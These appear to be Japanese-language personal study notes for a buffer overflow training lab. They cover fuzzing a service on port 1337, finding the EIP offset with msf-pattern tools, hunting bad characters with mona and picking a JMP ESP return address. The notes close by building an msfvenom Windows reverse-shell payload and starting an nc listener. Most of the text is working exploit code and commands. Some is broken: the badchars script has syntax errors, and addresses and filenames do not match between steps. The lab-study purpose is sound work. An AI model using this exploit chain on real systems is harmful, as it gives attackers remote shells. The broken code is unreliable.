# <span style="color:Gold;">Imminity Debugger</span>
debugを実行するごとに毎回Imminity DebuggerをRestart(Ctrl + F2)( 実行 F9 )（アプリ再起動）

***<span style="color:blue;">★Spiking</span>***  
ncでターゲットに接続し色々試す   
ImmunityDebuggerにワーキングフォルダを作成

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
!mona config -set workingfolder c:\mona\%p
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~   
ワーキングフォルダが作成出来ないときはmonaの設定ファイルを変更する場所はその時のエラーメッセージによる(C:\Program Files\Immunity Inc\Immunity Debugger/mona.ini)   
***<span style="color:blue;">★Fuzzer.py</span>***
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#!/usr/bin/env python3

import socket, time, sys

ip = "MACHINE_IP"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      #s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
python3 fuzzer.py
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

EIPが41(A)で上書きされる
2000byteでクラッシュするからオフセットが1900~2000の範囲であることを示す。オフセットより400byte多い2400byteのパターンを作る

***<span style="color:blue;">★offsetを探す</span>***   
パターン作成

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
msf-pattern_create -l 2400
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

exploit.pyのpayloadに入れる

***<span style="color:blue;">★exploit.py</span>***

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
import socket

ip = "MACHINE_IP"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
python3 exploit.py
EIP=6F43396E
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
!mona findmsp -distance 2400
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
msf-pattern_offset -l 2400 -q 6F43396E
>offset 1978
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
exploit.pyのoffsetに1978、retnにBBBBを入力
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
python3 exploit.py
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
EIPが42(B)で上書きされる   
***<span style="color:blue;">★悪い文字を見つける</span>***   
monaでバイト配列を生成しデフォルトでヌルバイト(\x00)を除外
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
!mona bytearray -b "\x00"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
***<span style="color:blue;">★bytearrayと同じ\x01から\xffまでの不正な文字列を生成する</span>***   
badchars.py
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
from __future__ import print_function
for x in rang(1,256);
 print("\\x"+"{:02x}.format(x),end='')
print()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
python badchars.py
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
exploit.pyのpayload変数にコピー
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
python3 exploit.py
ESP=00DCFA28
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ESP値を右クリック　Follow in dumpをクリック
06以降に不正な文字がある
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
!mona compare -f c:\mona\oscp\bytearray.bin -a 00CDFA28
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
悪い文字の可能性がある文字が出てくる
07 08 2e 2f a0   
>>- <span style="color: red;">bad charがうまく出てこない時はretnのBBBBの数を変更してみる</span>   
>>- 左下の表示方法も変更してみる
>>- 「右クリック」＞「Long」＞「Address with ASCII dump」  


![long ASCLL.JPG](../_resources/long%20ASCLL.JPG)


>★<span style="color:red;">1文字ずつ確認する</span>   
>1.バイト配列から文字を削除   
>2.エクスプロイトペイロードから文字を削除   
>3.exeファイル起動   
>4.monaを使用して比較   

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
!mona bytearray -b "\x00\x07"　　　　ペイロードからも\x07を削除
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
python3 exploit.py
ESP=00EFFA28
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
!mona compare -f c:\mona\oscp\bytearry.bin -a 00EFFA28(ESP)
possibly bad chars:2e 2f a0 a1
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
同じ作業を1文字ずつ繰り返しBad charsが出なくなるまでやる
ジャンプポイントを見つける
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
!mona jmp -r esp -cpb "\x00\x07\x2e\xa0"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Resultsのアドレスをexploit.pyのretn変数に入れる（アドレスをリトルエンディアンに変換して入れる）
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
retn="\xaf\x11\x50\x62"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ペイロードの生成にはエンコーダーが使用されている可能性があるためペイロードが自ら解凍するためのメモリスペースが必要になる。
このためパディング変数に16バイト以上のNOP文字列を設定する(\x90)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
padding="\x90" * 16
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
***<span style="color:blue;">★リバースシェルペイロード作成</span>***
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f py　-v payload
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
出力されたペイロードをexploit.pyのpayload変数に代入

***<span style="color:blue;">★リスナー起動</span>***
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
nc -lvnp 443
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
python3 exploint.py
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
